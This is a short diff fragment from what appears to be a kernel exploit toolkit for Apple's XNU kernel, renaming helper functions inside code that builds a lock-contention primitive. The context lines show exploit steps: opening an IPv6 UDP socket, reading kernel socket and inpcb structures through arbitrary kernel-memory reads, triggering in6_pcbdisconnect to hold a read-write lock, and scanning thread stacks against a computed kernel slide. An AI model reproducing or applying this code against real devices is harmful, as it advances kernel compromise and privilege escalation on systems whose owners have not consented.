@@ -342,7 +342,7 @@ void xpl_util_lck_read_necp_uuid_id_mapping_state(xpl_lck_rw_t util) {
 
 
 xpl_lck_rw_t xpl_lck_rw_lock_exclusive(uintptr_t lock) {
-    uintptr_t proc = xpl_xnu_proc_current_proc();
+    uintptr_t proc = xpl_proc_current_proc();
     
     /// STEP 1: Create a new IPv6 UDP socket
     struct sockaddr_in6 src_addr;
@@ -365,7 +365,7 @@ xpl_lck_rw_t xpl_lck_rw_lock_exclusive(uintptr_t lock) {
     xpl_assert(res == 0);
     
     uintptr_t socket;
-    int error = xpl_xnu_proc_find_fd_data(proc, sock_fd, &socket);
+    int error = xpl_proc_find_fd_data(proc, sock_fd, &socket);
     xpl_assert_err(error);
     
     uintptr_t inpcb = xpl_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET);
@@ -397,7 +397,7 @@ xpl_lck_rw_t xpl_lck_rw_lock_exclusive(uintptr_t lock) {
     dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
     /// STEP 5: Asynchronously disconnect `util->socket`. This will acquire the lock `util->target_lck_rw`
     dispatch_async(xpl_dispatch_queue(), ^() {
-        util->locking_thread = xpl_xnu_thread_current_thread();
+        util->locking_thread = xpl_thread_current_thread();
         dispatch_semaphore_signal(sem_disconnect_start);
         /// Triggers `in6_pcbdisconnect` method which acquires `util->target_lck_rw`. Since
         /// the method `xpl_util_lck_create_nstat_controls_cycle` has created a cycle in
@@ -552,7 +552,7 @@ int xpl_lck_rw_wait_for_contention(xpl_lck_rw_t util, uintptr_t thread, uintptr_
         xpl_assert_cond(xpl_kmem_read_uint32(lr_exclusive_gen - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_GEN_ADDR), lr_exclusive_gen - 4));
         
         uintptr_t found_address;
-        int error = xpl_xnu_thread_scan_stack(thread, lr_exclusive_gen, XPL_PTRAUTH_MASK, 512, &found_address);
+        int error = xpl_thread_scan_stack(thread, lr_exclusive_gen, XPL_PTRAUTH_MASK, 512, &found_address);
         if (error == EBADF || error == ENOENT) {
             xpl_log_verbose("no contention by %p (stack_scan err: %d)", (void*)thread, error);
             continue;
